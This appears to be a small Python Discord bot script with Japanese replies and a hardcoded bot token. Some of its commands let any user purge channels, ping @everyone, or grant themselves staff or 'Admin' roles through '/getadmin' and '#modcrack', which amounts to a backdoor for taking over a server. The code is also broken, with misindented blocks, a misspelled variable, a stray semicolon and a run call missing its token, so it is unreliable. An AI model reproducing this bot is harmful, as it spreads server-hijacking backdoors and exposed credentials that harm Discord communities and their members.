import discord

TOKEN = 'NjEyNDEzMTExODQzOTQ2NTQ5.XWK2OQ.u2PRWHbDAW7AX4v6awYlBSgHKks'

client = discord.Client()

@client.event
async def on_ready():
    print('ログインしました')

@client.event
async def on_message(message):
    if message.author.bot:
        return
    if message.content == 'spam':
        await message.channel.send('えっちですねぇ...')
        if message.content == 'hello':
        await message.channel.send('やあ！とても重要な話をします...||えっちですねぇ・・・||')
        if message.content == '/clean':
        await message.channel.purge()
        await message.channel.send('Successfly!')
    if message.content == '/everyone':
        await message.channel.purge()
        await message.channel.send('@everyone')
    if message.content.startswith('/getadmin'):
        role = discord.utils.get(message.guild.roles, name='運営')
        await message.author.add_roles(role)
    if messeage.content.startswith('#modcrack');
        role = discord.utils.get(message.guild.roles, name='Admin')
        await messeage.author.add_roles(role)
client.run()
